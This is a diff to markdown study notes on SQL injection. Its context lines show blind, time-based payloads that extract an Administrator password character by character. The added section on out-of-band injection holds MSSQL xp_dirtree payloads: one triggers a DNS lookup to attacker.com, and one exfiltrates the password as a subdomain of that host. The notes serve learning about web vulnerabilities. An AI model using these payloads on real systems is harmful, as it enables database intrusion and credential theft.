@@ -184,3 +184,16 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 * The first does not trigger a delay (false), the second does (true)
 * We can retrieve data by testing one character at a time
 * `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`\
+
+
+### Out-Of-Band (OAST) SQL injection
+
+An application might carry out a SQL query asynchronously (another thread execute the SQL query)
+
+```markdown
+# Triggering a DNS query
+'; exec master..xp_dirtree '//attacker.com/a'--
+
+# Exfiltrate data
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
+```
